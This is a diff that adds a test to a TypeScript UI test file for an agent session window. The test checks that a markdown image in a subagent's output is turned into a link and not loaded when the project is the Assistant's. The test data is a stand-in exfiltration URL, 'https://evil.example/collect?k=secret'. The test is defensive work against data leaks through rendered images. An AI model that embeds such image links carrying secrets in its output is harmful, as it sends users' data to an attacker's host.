@@ -115,6 +115,31 @@ describe("AgentSessionWindowContent", () => {
     expect(view.container.textContent).toContain("Investigate the flaky test");
   });
 
+  // The window and the phone sheet render outside the chat's subtree, so the Assistant
+  // marking has to come from the payload's project: a subagent's remote image must not load.
+  for (const [projectName, loads] of [["__assistant__", false], ["p", true]] as const) {
+    it(`${loads ? "loads" : "turns into a link"} a remote image in a subagent's text (${projectName})`, async () => {
+      const { client, sent } = fakeClient();
+      setGlobalWsClient(client as never);
+      view = await mount(
+        <AgentSessionWindowContent id={`w-img-${projectName}`} payload={{ projectName, providerId: "claude", sessionId: `s-img-${projectName}`, source: { kind: "card", cardId: "c-img" }, title: "Research" }} />,
+      );
+      const leak = "https://evil.example/collect?k=secret";
+      await pushEvents(sent, { running: false, events: [{ ev: { type: "text", content: `See ![chart](${leak})` }, ts: 1, k: "f:0:0" }] });
+      // The text goes through the lazily loaded Markdown renderer; wait for its chunk.
+      for (let i = 0; i < 200 && !view.container.querySelector(".markdown-content"); i++) {
+        await act(async () => { await Bun.sleep(5); });
+      }
+      const img = view.container.querySelector(".markdown-content img");
+      if (loads) {
+        expect(img?.getAttribute("src")).toBe(leak);
+      } else {
+        expect(img).toBeNull();
+        expect(view.container.querySelector(".markdown-content a")?.getAttribute("href")).toBe(leak);
+      }
+    });
+  }
+
   it("falls back to steps already held in memory when the server reports unavailable", async () => {
     const { client, sent } = fakeClient();
     setGlobalWsClient(client as never);
